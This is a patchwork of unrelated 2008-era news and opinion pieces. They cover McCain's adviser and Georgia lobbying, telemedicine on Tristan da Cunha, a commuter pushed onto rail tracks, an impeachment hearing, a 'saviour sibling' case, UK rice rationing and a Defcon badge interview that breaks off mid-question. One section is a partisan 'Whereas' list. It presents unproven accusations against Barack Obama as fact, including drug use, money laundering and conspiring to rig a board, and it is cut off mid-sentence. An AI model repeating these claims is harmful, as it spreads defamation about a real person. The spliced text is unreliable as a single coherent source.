Print This Email This Senator John McCain faces another political entanglement with top adviser Randay Scheunemann , who was a registered lobbyist for the Georgian government until earlier this year , Politico reported .
A public relations firm working for the Russian Federation disclosed the information to the Obama and McCain campaigns , making it clear that McCain 's Saturday morning criticism of Russian violence in Georgia is neither welcome nor without hypocrisy .
The Obama campaign immediately took advantage of the disclosure .
" John McCains top foreign policy adviser lobbied for , and has a vested interest in , the Republic of Georgia and McCain has mirrored the position advocated by the government , " said Obama spokesman Hari Sevugan .
Sevugan added that it was a " conflict of interest " following naturally from McCain 's close ties to lobbyists .
Scheunemann said such criticism is unjust considering that he severed his ties to Georgia and the firm representing it March 1 and that McCain has supported the country 's shift towards the West since he visited in 1997 .
But Scheunemann , the chief foreign policy adviser for the campaign , had already been working for the McCain campaign for months before he ended registered ties with several foreign governments including Georgia , The New York Times reported .
McCain took Scheunemann with him on a trip to Georgia in 2006 .
The Republican Senator harshly criticized Russia for fighting in Georgia that has already claimed more than 2,000 lives .
That brought chiding from the Obama camp , which said McCain was quick to judge a complicated situation , adding that the international community needs to get involved to protect Georgia 's sovereignty .
Scheunemann defended McCain 's statement and criticized the Obama campaign , suggesting it was placing too much blame on both countries .
" Sen. McCain is clearly willing to note who he thinks is the aggressor here , " Scheunemann said .
" I do n't think you can excuse , defend , explain or make allowance for Russian behavior because of what is going on in Georgia . "
The adviser did not mention that fighting in Georgia began when the country 's government tried to retake a pro-Russian region that won autonomy from Georgia in the early 1990s , The New York Times reported .
Scheunemann has been at the center of several scandals , including recent evidence that linked him with a lobbyist under scrutiny from Congress for offering access to top White House officials in exchange for six - figure donations .
The adviser 's troublesome connections are one reason why The Wall Street Journal said McCain is " on the defense over ties to lobbyists . "
FEW places on earth are as isolated as Tristan da Cunha .
This small huddle of volcanic islands , with a population of just 269 , sits in the middle of the South Atlantic , 1,750 miles from South Africa and 2,088 miles from South America , making it the most remote settlement in the world .
So it is a bad place to fall ill with an unusual disease , or suffer a serious injury .
Because the islands do not have an airstrip , there is no way to evacuate a patient for emergency medical treatment , says Carel Van der Merwe , the settlement 's only doctor .
“ The only physical contact with the outside world is a six to seven day ocean voyage , ” he says .
“ So whatever needs to be done , needs to be done here . ”
Nevertheless , the islanders have access to some of the most advanced medical facilities in the world , thanks to Project Tristan , an elaborate experiment in telemedicine .
This field , which combines telecommunications and medicine , is changing as technology improves .
To start with , it sought to help doctors and medical staff exchange information , for example by sending X - rays in electronic form to a specialist .
That sort of thing is becoming increasingly common .
“ What we are starting to see now is a patient - doctor model , ” says Richard Bakalar , chief medical officer at IBM , a computer giant that is one of the companies in Project Tristan .
A satellite - internet connection to a 24 - hour emergency medical centre in America enables Dr Van der Merwe to send digitised X - rays , electrocardiograms ( ECGs ) and lung - function tests to experts .
He can consult specialists over a video link when he needs to .
The system even enables cardiologists to test and reprogram pacemakers or implanted defibrillators from the other side of the globe .
In short , when a patient in Tristan da Cunha enters Dr Van der Merwe 's surgery , he may as well be stepping into the University of Pittsburgh medical centre .
It is a great comfort to local residents , says Dr Van der Merwe , knowing that specialist consultations are available .
Most of the technology this requires is readily available , and it was surprisingly simple to set up , says Paul Grundy , a health - care expert at IBM .
The biggest difficulty , he says , was to install the satellite - internet link .
In theory , this sort of long - distance telemedicine could go much further .
In 2001 a surgeon in New York performed a gall - bladder removal on a patient in Paris using a robotic - surgery system called Da Vinci .
Although that was technologically impressive , it may not be where the field is heading .
Home is where the technology is
For advances in telemedicine are less to do with the tele - than with the medicine .
In the long term , it may be less about providing long - distance care to people who are unwell , and more about monitoring people using wearable or implanted sensors in an effort to spot diseases at an early stage .
The emphasis will shift from acute to chronic conditions , and from treatment to prevention .
Today 's stress on making medical treatment available to people in remote settings is just one way telemedicine can be used — and it is merely the tip of a very large iceberg that is floating closer and closer to home .
That is because telemedicine holds great promise within mainstream health care .
Countless trials are under way to assess technology that can monitor people who have been diagnosed with heart conditions , or diseases like diabetes , from the comfort of their own homes .
Rather than having their devices periodically checked at a clinic , some pacemaker patients can now have their implants inspected via mobile phone .
That way , they need only visit the clinic when it is absolutely necessary .
The shift to telehealth reflects the broader shift from diagnosis and treatment to “ wellness ” .
Similarly , BodyTel , based in Germany , is one of several firms to have developed sensors based on Bluetooth wireless technology that can measure glucose levels , blood pressure and weight , and upload the data to a secure web server .
Patients can then manage and monitor their conditions , even as they give updates to their doctors .
Honeywell , an American industrial giant , has devised a system that patients can use at home to measure peak flow from their lungs , ECG , oxygen saturation and blood pressure , in order to monitor conditions ranging from lung disease to congestive heart failure .
Doctors continually review the data and can act , by changing the patients ' medication , for example , if they spot any problems .
This sort of thing appeals to both patients and health - care providers alike .
The patients keep their independence and get to stay at home , and it costs less to treat them .
And as populations age in developed countries , the prospect of being able to save money by treating people at home looks increasingly attractive .
It is not just people with diagnosed conditions who are starting to receive this kind of equipment .
Since 2006 , Britain has spent £ 80 m ( $ 160 m ) on “ preventative technology grants ” which provide special equipment to enable 160,000 elderly people to stay in their homes .
Most of today 's technology , however , calls on the patients to remember to monitor themselves , and also requires them to operate the equipment .
For some patients , such as those in the early stages of Alzheimer 's disease , that is impractical .
So a lot of work is being done to automate the monitoring process and make the equipment easier to use .
William Kaiser and his colleagues at the University of California , Los Angeles , have developed a “ smart cane ” to help monitor and advise people convalescing at home , for example .
“ It has force sensors that measure pressure at the tip of the cane and around the handle .
It also has motion sensors and accelerometers , ” says Dr Kaiser .
It uses these to calculate the gait of the patient and work out how they are doing with the cane , giving them feedback about how they could make better use of it to recover from , for example , a hip replacement .
“ It provides guidance , either as beeps or it can talk to you , ” he says .
Another approach is to use sensors embedded in the home .
Oliver Goh of Implenia , a Swiss building - management firm , has come up with a system to monitor the well - being of the occupant of a house .
Using sensors on doors and mattresses , smart pill boxes that can tell when they are being opened , heart - monitors and a location - sensing wristwatch — the system allows carers to keep tabs on elderly people .
Implenia now has six elderly volunteers lined up to test the technology , says Mr Goh .
He hopes that if they have a heart attack , cannot get out of bed or need help , their carers will soon know .
Ultimately , he says , the aim is to see if this sort of approach can help to extend life expectancy .
Prevention is better than cure
Looking even further ahead , some day it may make sense to give these technologies to healthy people , the “ walking well ” .
If sensors can monitor people without a threat to their privacy or comfort , doctors may able to spot diseases before the patient notices any symptoms .
“ It 's moving from telemedicine to telehealth and teleprevention , ” says Dr Grundy of IBM .
It could also improve the efficiency of health - care systems , he says .

This kind of approach could save money as well as spotting illnesses early , says Dr Kaiser .
“ We 'll detect them earlier when the cost of treatment and impact on an individual will be less , ” he says .
The technology for this does not yet exist , admits John Linkous , executive director of the American Telemedicine Association .
“ There still is n't a device that can give you a complete body check , ” he says .
“ But I 'm very optimistic about it in the long run . ”
One idea is to use wireless infra-red skin sensors to measure blood - count , heart - rhythm and the level of oxygen in the blood .
Another is to implant wireless sensors powered by the wearer 's own body heat .
Yet another common idea is to use smart toilets that can monitor human waste for the telltale signs of intestinal disease or cancer .
The hard part is not so much developing the sensor technology , says Dr Linkous , as sifting through the results .
“ It would produce a tsunami of data , and the problem is that we are n't set up with health - care systems that can deal with all that , ” he says .
The answer will be even more technology , says Dr Bakalar .
“ There has to be a way of filtering this information so that it does n't overwhelm the medical services , ” he says .
The obvious approach is to use “ expert systems ” — software programmed with expert medical knowledge and that can make clinical judgments .
Like telemedicine , expert systems have been around for some time .
Trials in Denmark , to advise doctors how to prescribe , suggest the technology has great scope .
Sometimes they can reach better clinical judgments than human experts do .
But they are not widely used , partly because doctors are unwilling to be bossed around by a computer in the corner , but also because they have been difficult to integrate into medical practice .
They could be ideally suited to telehealth , however , quietly sifting through the data generated by sensors and only raising the alarm and calling in their human colleagues when it becomes necessary to do so .
The shift from telemedicine to telehealth reflects a broader shift from diagnosis and treatment to “ wellness ” .
Taken to its technological conclusion , this would involve using wireless sensors and implants to screen entire populations for early signs of disease as they go about their daily lives .
If it can be made to work , the days of making an appointment to see your doctor when you are not feeling well could be over .
Instead , it may be your doctor who calls you .

Whereas : Senator Barack Obama is an admitted illegal drug user and
is believed to have used illegal drugs as recently as November 1999
or more recently .
Mr. Obama has maintained contact with other
admitted illegal drug users .
Whereas : Senator Barack Obama has maintained regular contact
with known criminals such as Antoin ( Tony ) Rezko and other
criminal elements in Chicago and Illinois .
Mr. Obama has
conducted business with these criminals and received campaign
donations from them .
Mr. Obama was compelled to return an estimated $ 250,000 in
donations related to Tony Rezko .
Whereas : Senator Barack Obama has consistently lied about his
contact with convicted criminal Tony Rezko .
The Tony Rezko
corruption trial revealed that FBI mole John Thomas helped investigators
“ build a record of repeat visits to the old offices of Rezko and former
business partner Daniel Mahru’s Rezmar Corp. , at 853 N. Elston , by
Blagojevich and Obama during 2004 and 2005 , ” according to the February
10 , 2008 Chicago Sun-Times .
Whereas : Senator Barack Obama has engaged in unscrupulous business
practices , in particular with Mr. Robert Blackwell .
Mr. Obama
received an $ 8,000 per month “ legal retainer ” from Mr. Blackwell
for a total of $ 112,000 and reported the income through his law firm
in a manner not unlike money laundering .
Obama , along with Obama
campaign manager Dan Shomon , procured $ 320,000 in state grants
for Blackwell ’s company Killerspin .
Blackwell companies contributed
over $ 32,000 to the Obama campaign in 2007 .
Whereas : Senator Barack Obama used the office of IL Senator to
facilitate the vote rigging in Chicago as chairman of the Illinois Senate
Health and Human Services Committee .
Mr. Obama pushed legislation in Senate Bill 1332 to reduce the number of members of the Health Facilities Planning Board from 15 to 9 .
Mr. Obama did conspire with Stuart Levine , Tony Rezko and Rod Blogojevich to rig the committee and was rewarded with campaign contributions .
The new members appointed included 3 doctors who contributed to Mr. Obama .
On April 21 , 2004 , Stuart Levine explicitly advised Dr. Robert Weinstein , who is now indicted , of Tony Rezko ’s role in manipulating the Planning Board ’s vote .
Whereas : Senator Barack Obama has engaged in lies and deception
about his past .
Mr. Obama lied about his contact level with
convicted criminal Tony Rezko , the amounts and sources of

A complaint
has been filed with the Bar Association of Illinois alleging
that Mr. Obama did not answer truthfully all questions on the
application to the bar .
Whereas : Senator Barack Obama has invoked the FOIA in Illinois
when it was politically expedient and ignored or violated the
FOIA at other times .
In the Illinois Senate proceedings of
Mr. Obama , in Senate Bill 1416 , pleads the importance of businesses
bidding on state contracts having improved access to FOIA data .
When
later questioned about his records during his term in the IL
Senate , Mr. Obama gave evasive answers or refused to supply records .
Whereas :
The First Amendment provides a right for the people “ to

I 'm lucky to be alive :
The female commuter shoved onto rail line after she told two thugs to stop smoking
Shaken : Linda Buchanan broke her wrist after being pushed on the track
All she did was what any good citizen might do - ask two young men on a railway platform to stop smoking .
But commuter Linda Buchanan almost paid with her life when the thugs shoved her onto the tracks .
As fellow passengers stared in horror , Mrs Buchanan , a management consultant , landed just inches from a 750 - volt live rail , snapping her left wrist and leaving her perilously close to being run over by a train .
Last night , the badly shaken mother - of - three told how she felt lucky to be alive .
The shocking incident at Farningham Road Station , near Swanley in Kent , again highlights what ordinary people risk by confronting thugs .
Last month , London Mayor Boris Johnson warned people to walk on by rather than get involved in trouble .
And in January , Home Secretary Jacqui Smith was criticised after admitting she would not feel safe walking the streets after dark .
Yesterday , as she did every morning , Mrs Buchanan , 58 , joined fellow commuters waiting for the 7.12 am train to London Victoria .
But as she passed the two men , they threw her on to the tracks .
Police said Mrs Buchanan had initially ticked off the pair on Monday for breaking the smoking ban .
It is unclear if she reprimanded them again or whether they had harboured a grudge for two days .
Divorced Mrs Buchanan looked shattered as she wept and recalled the horror of the assault last night .
Morning train :
The platform at Farningham Road
Speaking on the doorstep of her £ 300,000 home near Dartford , Kent , she said : ' I feel lucky to be alive .
It could have been a lot worse than it is and I 'm shocked by the whole experience . '
A witness to the attack said : ' There were quite a few people on the platform waiting for the train when it happened .
' A scuffle broke out and she was shoved onto the tracks .
There were definitely broken bones but she was more in shock than anything .
Once she was on the platform , we could n't move her , she was in such a state . '
Detective Inspector Bob Richardson said : ' It would appear the woman had spoken to the men about smoking earlier this week .
' This morning when she was at the station , she was walking past the same men when one pushed her and she fell onto the track .
Inches from death : Miss Buchanan landed beside the 750 - volt live rail which would have killed her and emerged with just bruising and a fractured wrist
' The woman was very lucky she was not more seriously injured .
The third rail carries 750 volts of electricity and she could have been electrocuted or even struck by an early morning train . '
Quick - thinking staff switched off the power to the line and a train a few hundred yards up the track was halted while rescuers jumped down to help Mrs Buchanan .
An off - duty policeman chased the two youths and police scrambled a helicopter but last night they were still on the run .
Friends said Mrs Buchanan , who lives alone , was a woman unafraid to intervene if she thought something was wrong .
Neighbour Jenny Davies , 60 , said : ' Linda is a very principled person who is not afraid to speak her mind .
If she thinks someone is amiss she will say so .
She is very lucky to have lived through what happened and it might make her think twice in before saying something . '
Another neighbour , Richard Teare , revealed that on Tuesday there had been a near - confrontation with two people - possibly the same pair - smoking on the same platform .
He said : ' I was waiting on the platform with Linda and there were a couple who were smoking .
I stared the guy down until he put out his cigarette but Linda was on the verge of saying something .'
One of the yobs was described as white , in his mid 20s , 6ft tall , and of stocky build with short - cropped brown hair and wearing beige shorts , a green T - shirt and trainers .
His accomplice was also white , in his early 20s , of medium build , and was wearing bright red shorts and a dark top .
A spokesman for rail operator Southeastern said : ' We are appalled by this incident and hope the perpetrators are quickly identified . '
Mrs Buchanan is a senior managing consultant at DBM plc , a U.S - owned company with offices around the world .
In May last year , 22 - year - old Kevin Johnson , a father - of - one , was stabbed to death outside his home in Sunderland by yobs he had asked to keep the noise down .
Then in August father - of - three Garry Newlove , 47 , was punched and kicked to death after confronting a gang of drunken thugs vandalising his wife 's car in Warrington , Cheshire .
Last month , former soldier Stan Dixon , 60 , was attacked after asking a group of youths to stop swearing in front of a woman on a bus in Horden , County Durham .
And 16 - year - old Ben Kinsella was stabbed to death after he tried to break up an argument outside a North London bar .
Colbert mocks McCain speech with new ' green screen challenge '
Technologically unsavvy Republican presidential candidate John McCain may be regretting his choice of a green background in a nationally televised speech earlier this month .
Playing off an earlier challenge to his viewers , Comedy Central host Stephen Colbert called for submissions to his " green screen challenge " to make McCain 's much - panned speech seem more interesting .
On Thursday night 's show , Colbert aired the first set of submissions .
Dozens more have been posted to YouTube .
Among the more popular entries online are videos that feature pictures of McCain with President Bush or recall his supporters " beat the bitch " reference to Hillary Clinton .
One video places McCain into historical footage such as Queen Elizabeth 's first televised address and Martin Luther King 's " I have a dream speech , " saying he was there during those events .
" John McCain , he 's that old , " the video concludes .
On Thursday night 's show , Colbert described McCain 's rhetorical style as " tired mayonnaise . "
The remixes were necessary to spice things up the host said , and clearly that was McCain 's intention .
" He clearly asked for our help by giving a speech in front of a green screen , " Colbert said .
" I do n't want to bog you down with technical jargon , but basically Jesus made green a magical color .
Anything you film in front of it can become something else . "
John McCain is notoriosuly averse to technology ; his opponent is often seen on his BlackBerry .
McCain 's tech deficit poses problem
John McCain ’s low comfort level with the Internet , a technology familiar to 73 percent of American adults , poses a political problem for his campaign and exacerbates mostly unspoken concerns about his age .
It also contains an element of irony : In 2000 , he was buoyed by pioneering online fundraising efforts .
“ The whole thing is flabbergasting to me , ” said Joe Trippi , the Democratic consultant who served as the campaign manager for the 2004 Howard Dean campaign that was the first to become wildly successful at raising money and support online .
Advertisement
“ McCain ’s 2000 campaign was so tech - savvy that it scared me .
It was the whole reason I started focusing on the tech stuff for the Democrats , ” Trippi said .
Now , though , McCain is battling the impression that he ’s an Internet “ illiterate . ”
When Politico ’s Mike Allen asked him in January whether he uses a Mac or PC , the candidate replied , “ I am an illiterate that has to rely on my wife for all of the assistance that I can get . ”
Since , he ’s taken to Macs , become a student of the contemporary , blog - driven media cycle , and become a reader — if not yet a writer — of e-mail .
In interviews with Politico , techies offered a range of solutions to turn around the image of the tech - challenged Republican , and implored him to stop talking about computers , and start showing that he uses them .
Some suggested that McCain pick up some gadgetry .
A flashy wireless earpiece might remind voters of the gear he wore as a fighter pilot , joked Soren Dayton , a Republican consultant who left McCain ’s campaign after an impolitic posting to his own Twitter account .
David All , a tech - centric Republican consultant , had another suggestion .
“ If I were counseling John McCain , I would have him standing in line for an iPhone , ” he said .
“ I would make sure the next time John McCain is around a group of photographers , he ’s on his iPhone and he ’s checking out Meghan ’s blog , ” he said , referring to McCain ’s daughter ’s online diary of the campaign trail .
All of the techies suggested that McCain open his own Twitter account and post short messages directly to the Internet .
“ I would n’t let any staff anywhere near it , ” he said .
“ For the love of G-d , do n't let him be photographed using the web as if it 's something to photograph him doing , ” e-mailed a Republican consultant and blogger , Karol Sheinin .
“ It will just remind everyone of that time they taught their grandpa about e-mail . ”
“ He has to stop talking about it , ” said Josh Levy , the managing editor of the social networking site Change.org .
“ He should just drop it into conversation , say , ‘ Yeah , I only use Firefox . ’ ”
McCain ’s progress , so far , has been slow , and delivered in language that suggests he ’s not ready to name - drop a popular open - source browser just yet .
In an interview with the San Francisco Chronicle , he explained that “ I am forcing myself .
...
Let me put it this way , I am using the computer more and more every day . ”
“ I am learning to get online myself , and I will have that down fairly soon , getting on myself , ” he told The New York Times in July .
“ I do n’t expect to be a great communicator , I do n’t expect to set up my own blog , but I am becoming computer literate to the point where I can get the information that I need . ”
His efforts have won him brutal derision from the online left .
“ McCain Makes Historic First Visit to Internet , ” Obama - backing satirist Andy Borowitz headlined one imagined dispatch .
“ Sen . McCain said that he had embarked on his visit to the Internet to allay any fears that he is too out - of - touch to be president , adding that he plans to take additional steps to demonstrate that he is comfortable with today 's technology : ‘ In the days and weeks ahead , you will be seeing me rock out with my new Walkman , ’ ” Borowitz wrote .
Others have been less gentle .
After a spokesperson told The Associated Press that McCain is “ fully capable of browsing the Internet and checking Web sites , ” a front - page diarist on Daily Kos sneered : “ I hope someone gave him a cookie . ”
McCain ’s defenders say his years of work on communications legislation have made him a master of the big ideas , if not the actual usage , of communications technology
He ’s demonstrated a cultural affinity with one aspect of online campaigning : Bloggers are welcome on his conference calls , and have common ground with his combative , free - wheeling style .
He ’s hired a blogger of his own , Michael Goldfarb .
“ Who 's Web - Savvy Now ? ” asked a recent headline on McCain ’s blog , after poking fun at the Obama campaign for editing the Iraq policy on its site .
Some say he ’s just as well off without the contemporary trappings .
“ The guy is pretty busy , ” said Dayton .
“ The last thing he needs is a BlackBerry . ”

The brave efforts of Congressman Dennis Kucinich and others to attempt to bring articles of impeachment against the president and the vice president cannot be underestimated , however , due to the brick wall erected before them by the Democratic leadership , statements at the hearing were very limited .
“ To the regret of many , this is not an impeachment hearing , ” said Rep. John Conyers Jr. , Michigan Democrat , noting that the House would have to approve any hearings that could move formally on impeachment .
Before the hearing even began it became clear that Conyers and the rest of the committeewere not even considering the possibility of impeachment .
In fact we are not even allowed to use the word impeachment for Bush ’s impeachment hearing .
The “ unimpeachment hearing ” did not allow any remarks or formal accusations that would imply or state that the president lied or obstructed the truth in any way , nor did it allow any references to alleged impeachable offenses .
Former prosecutor and author of The Prosecution of George W. Bush for Murder , Vincent Bugliosi summed up the hearing in his opening statement to the Committee :
“ I have been told that the rules of this house dictate that although I can quote what president George Bush said I am forbidden from accusing him of a crime or even of any dishonorable conduct , only being allowed to use the words “ Bush Administration ” or “ Administration officials ” this will not make for the best of articulations , but I will do the best that I can ”
Though Bugliosi went on to state that “ The terrible reality is the Bush administration has gotten away with thousands and thousands or murders , ” under the rules of the House , we must ignore that .
We must also ignore the boisterous applause for the former prosecutor ’s words , which drove Rep. Lamar Smith ( R - TX ) , the committee ’s ranking member , to ask that Chairman John Conyers clear the hearing room .
That too is not allowed .
When Cindy Sheehan shouted , “ Thank you Vince ” , Conyers reminded her that it was forbidden to express any demonstrations of approval or disapproval of the proceedings .
An angry and bemused Sheehan was already on her way out of the door when Conyers ordered her to be removed .
Though Dennis Kucinich was afforded the luxury of presenting one of his articles of imp … .
er unimpeachment , he was not allowed to present any evidence or facts to back it up , of which we know there are ample amounts of .
Presenting false intelligence as a pretext to engage in war , ordering illegal torture and authorizing warrantless wiretapping anyone ?
Kucinich asked :
“ The question for Congress is this : what responsibility does the President and members of his Administration have for that unnecessary , unprovoked and unjustified war ? ”
“ The rules of the House prevent me or any witness from utilizing familiar terms .
But we can put two and two together in our minds .
We can draw inferences about culpability . …
“ I ask this committee to think , and then to act , in order to enable this Congress to right a very great wrong and to hold accountable those who misled this nation , ” he concluded .
Republicans reminded us all that impeachment would set a dangerous precedent by punishing a president for his political policies .
Heaven forbid .
“ There ’s no evidence in these allegations of the president violating his oath of office , ” said Rep. Mike Pence , Indiana Republican .
Pence was technically correct given that no one was allowed to present any evidence .
Jeremy Rabkin , a George Mason University law professor , said Bush administration critics might be using threats of impeachment to express anger toward the president over policy matters .
Others called the meeting a waste of time with Texas Republican Rep. Lamar Smith saying , ” Nothing is going to come out of this hearing with regard to impeachment of the president .
I know it , the media knows it , even the speaker knows it . ”
At several points Smith was seen fuming and at one point blurted out “ This is not impeachment hearing ” .
Smith , mocked the proceedings , comparing them to last month ’s hearing featuring former White House spokesman turned whistleblower Scott McClellan , whom he took pride in comparing to Judas .
“ If last month it appeared we hosted a ‘ book of the month club , ’ this week it seems that we are hosting an anger management class , ” Smith said .
“ This hearing will not cause us to impeach the President ; it will only serve to impeach our own credibility . ”

Catherine could not make her own red blood cells Catherine is a little girl condemned by genetic disease to a gruelling regime of treatment .
She could be released from it by a sibling , but the sibling is not yet conceived .
And can one child 's health ever be put at risk to save another's ?
When Catherine , the first child of Charles and Clara , was born in 2001 , she seemed healthy - but not for long .
" She was very listless and would fall asleep in the middle of a feed , " said her mother .
" When she was 11 weeks old , she was pretty much pure white , you could n't even see her lips .
We took her into A&E . "
Tests revealed that Catherine had virtually no red blood cells .
She was eventually diagnosed with Diamond Blackfan Anaemia ( DBA ) , a genetic disease in which few if any red blood cells are produced by the bone marrow , producing anaemia .
DBA can be treated with day long monthly transfusions .
However , every transfusion adds iron to the body which will cause irreversible organ damage unless removed .
Removal involves giving a drug given as a continuous transfusion through a needle , all through the night , five nights a week .
" Catherine hated it , screaming ' I do n't want it , I do n't want it ' , " said Clara .
" She got used to it , but often said : ' Why can't I be normal ' . "
Risk of early death DBA carries a one in four chance of early death because of organ damage and an increased risk of childhood cancer .
" Once we saw what her quality of life was and the problems that she might have in the future , we started saying is there something else we can do ? " , said Clara .
A bone marrow transplant was the only option .
One from an unrelated donor carried up to a 30 % risk of death for Catherine , one from a related donor a 5 % risk .
Charles and Clare had intended having another baby anyway and hoped that a baby brother or sister would be a tissue match .
With each pregnancy there is the same one in four chance of a match .
But it is possible to use a technique normally used in pre-implantation genetic diagnosis ( PGD ) , in which a cell from the three - day - old embryo is taken to screen out serious genetic disease , for tissue typing , to guarantee that a sibling is a tissue match , before being replaced .
The uncertainty of IVF gives a one in 10 chance of successful pregnancy with such a match .
Spontaneous mutation
There was however a major problem : DBA can be inherited or arise as a spontaneous mutation .
Which sort did Catherine have ?
This is not preventing harm to a child , this is creating a sibling for someone else - is that sufficient moral reason to go ahead ?
Deborah Bowman
Kings College Hospital
There was no family history of the condition .
Tests on Catherine showed she did n't have any of the known mutations that cause DBA , but there are some as yet uknown .
It meant that no - one could test whether another baby had the condition or not .
Not being able to rule out DBA was a major ethical issue .
So Clara and Charles decided to have a baby naturally .
But the new baby was n't a match .
By this time , Catherine was three and the couple were acutely aware that her condition was deteriorating .
She had to have a transplant before she became too sick to survive the procedure .
They decided to go for tissue typing .
To do this they needed to have a licence from the Human Fertilisation and Embryology Authority .
But at the time , the HFEA only allowed PGD to be used for tissue typing where a disease could be screened out .
This was not possible in Catherine 's case .
So the couple went to the US , where it was permitted .
But two attempts failed .
They were psyching themselves up for a third attempt , when they read about a UK couple in the same situation as themselves , who had been given a licence by the HFEA following a judicial review .
They decided to try for a ' saviour sibling ' using PGD .
Devastating blow
The procedure of taking stem cells for a bone marrow transplant would not harm Catherine 's sibling , because they could be obtained from cord blood at birth .
When baby sister , McKenzie was born , not enough stem cells could be collected for a transplant .
It was a devastating blow - but at least she was free from DBA .
" Every picture I took of them together had added meaning because Catherine was looking at her lifeline , " said Clara .
A much more invasive collection of bone marrow from McKenzie involving 90 minutes of general anaesthesia was now required .
There is no benefit to the donor , and McKenzie was not able to provide consent .
The chances of success for Catherine were getting less as time went on , but the younger McKenzie was , the greater the risks of anaesthesia for her .
Competing interests
Here the ethical issues are the competing ' best interests ' of the sisters .
There is also the issue that the donation will only cure Catherine 's symptoms , not rid her of the condition .
There is a good chance it could fail .
How would McKenzie feel later knowing that her donation failed to save her sister ?
And should Catherine 's kidneys fail , then once again , McKenzie would be the first choice of donor .
The Clinical Ethics Committee decided that the bone marrow transplant should go ahead .
It took place 18 months ago .
It was a success and Catherine continues to do well .
The case will be discussed on Inside the Ethics Committee will be broadcast on Wednedsay 6 August at 2000 BST on BBC Radio 4 , and for seven days on BBC iPlayer Your Comments :
As a mum , I feel for the couple .
I would chop my own legs off for my daughter if it came to saving her life .
However , I do n't think " saviour siblings " are ethical or fair on the child being born to " save " the other .
They have no say in what is done to their body for someone else 's benefit .
Why should a healthy baby have to go through that ?
At what point do they get the right to say no ?
Karen Reekie , London , UK
It 's disgusting that anyone can be forced to be a donor of any part of their body without their consent .
If I found out that my parents had used me in that way I would be full of loathing for them .
The " saviour sibling " is being put at risk , for no benefit to themselves , before they can even understand what 's going on .
Babies are people , not raw materials .
Gabriel , Leicester , UK If I had a child with Diamond Blackfan Aneamia , or any other fatal childhood illness , I would try everything to cure him or her and I 'm confident it'd be the same with any parent .
Realistically if someone told you there was a cure for your dying child you 'd take it , regardless of the sketchy ethics involved .
In regards to the point that this will not " cure " Catherine it is important to note that the symptoms themselves are incredibly dangerous .
It is like arguing against Chemotherapy which does n't cure cancer , but instead treats the symptoms .
Ryan Mclean , Leeds , UK
As a bone marrow donor myself , I find this dilemma interesting and heartbreaking at the same time .
I cannot imagine the impossible situation these parents found themselves in .
However , I do find it hard to accept that it is moral to " produce " a child to order , to save another , reducing its status to that of a laboratory animal .
The risks to the donor child are great , and there is the chance of losing both of them .
If a donation goes ahead and fails , the parents are left with trying to love the donor child without allowing the failure to cloud their feelings .
I wish the whole family continued good health and hope other cases are small in number .

This is a really difficult matter .
I do not honestly know how I would decide .
Yet I know that as long as one believes in the individual and his or her rights , it can not be right to have another child only to save the first one .
The difficulty arises in the fact that this is never the only reason .
If Catherine is doing well , if the treatment was a success , then the justification for the procedure is there - but too late !
If the sibling is willing to help ( and able to understand this ) , then there is no problem .

The great rice crisis : Rationing at UK supermarkets as world prices soar 70 per cent
By CHRISTOPHER LEAKE
Supermarkets are rationing rice in some stores after panic - buying by customers worried about a global shortage .
Retailers including Tesco , Asda , Morrisons and Lidl have introduced quotas for the staple food , which has increased in price worldwide by 70 per cent in a year .
Shortage : Supermarkets are rationing rice after panic - buying by customers
It is believed to be the first time major stores have limited purchases of such foodstuffs since sugar and bread were restricted in the Seventies because of strikes by producers .
Netto , the Danish - owned chain with 184 UK stores , has limited its 10kg bags of rice to one per customer .
Lidl , the German - owned cut - price group with 380 British outlets , has restricted purchases to ‘ family volumes ’ to stop bulk - buying by traders .
Most of the limits have been introduced in areas of Leicester which have large Asian populations .
Tesco said that for two weeks its store in the Hamilton area of the city had limited customers to two packs of rice per person .
But a spokeswoman insisted : ‘ There is no supply problem .
Rice was restricted for a couple of weeks at one store only .
No other Tesco stores have been affected . ’
Customers at the Morrisons store at Freemans Park , Leicester , were being restricted to six packs of rice , regardless of size , per customer .
The Asda store at nearby Thurmaston imposed similar restrictions , but at a national level the company denied it had any rationing in place .
The run on rice supplies in the UK follows rationing imposed in the United States by Wal - Mart and its discount warehouse Sam ’s Club .
America ’s largest warehouse group Costco , which has outlets in Britain , has been another chain to warn that customers are panicking about shortages of rice and flour and are buying up supplies to hoard .
The reasons for the soaring cost of rice include the rising demand in the Far East as living standards improve .
Less land is also now allocated to cultivating the crop – and there have been supply and distribution difficulties caused by bad weather .
The price of a 1kg bag of basmati rice – which is popular with curries – has risen 27 per cent at Tesco and Asda and 39 per cent at Sainsbury ’s in the past year , according to comparison website MySupermarket.co.uk .
The knock - on effect of similar rises and global concern could now lead to an increase in the cost of Indian and Chinese meals and takeaways .
Key rice producing countries have already banned exports to ensure their own people can continue to afford it .
Exports have been blocked by China , India , Vietnam and Egypt , which is increasing the uncertainty .
A British Retail Consortium spokesman said : ‘ Supermarkets are aware of issues of global supply and have already taken necessary steps to ensure adequate rice supplies .
' We are confident there wo n’t be shortages on shelves . ’
Later this week Defcon , the world 's largest hacker convention , will kick off in Las Vegas .
One of the more popular gadgets from the previous two Defcons were the hackable convention badges .
This year , we convinced Defcon 's founder Jeff Moss , aka Dark Tangent , and badge - designer Joe " Kingpin " Grand , to give Wired.com an exclusive sneak preview of the Defcon 16 badge .
Keep in mind that the badge in the photo is a prototype ; the actual badges will be a different color , wo n't have the USB and debug ports soldered on , nor include an SD card ( so bring one , seriously ) .
Threat Level : Defcon 15 's badge was exponentially more complicated and functional than Defcon 14's badge .
How does this year 's badge compare to the DC 15 badge ?
Joe Grand : Last year 's badge was sort of an over - engineered project .
We wanted to do something that was cool and different than the year before , but it ended up getting more complicated because of design problems along the way ...
I was really aiming to have something a little less complicated and a little less over - engineered than Defcon 15 , but still more complicated then Defcon 14 and have enough hackable features to make it interesting enough for people .
It 's more simple than last year but also more powerful .
TL : Why did you choose a Freescale microprocessor , and why did you choose the MC9S08JM60 over the MC9S08QG8 ?
JG : The guys at Freescale have been super supportive throughout both the Defcon 15 and this Defcon 16 badge .
One of their things is that they have a lot of engineers who truly love engineering and they love coming up with new products that use their technologies .
They understand that it is a hacker gathering and the hackers are ultimately the ones who are creating the cutting - edge products and they 're messing around with technology and doing things that have n't been done before .
They love the concept and they love being involved with Defcon ...
The JM60 was a new product that they just launched ...
We looked at the processor and said the JM60 has support for USB so let 's use USB .
It has support for a Secure Digital card so let 's add SD in there ...
I rarely come across companies that are as passionate as I am about a project and these guys are , so it 's a total thrill to be able to work with them .
TL : What components and other fun stuff does the badge have ?
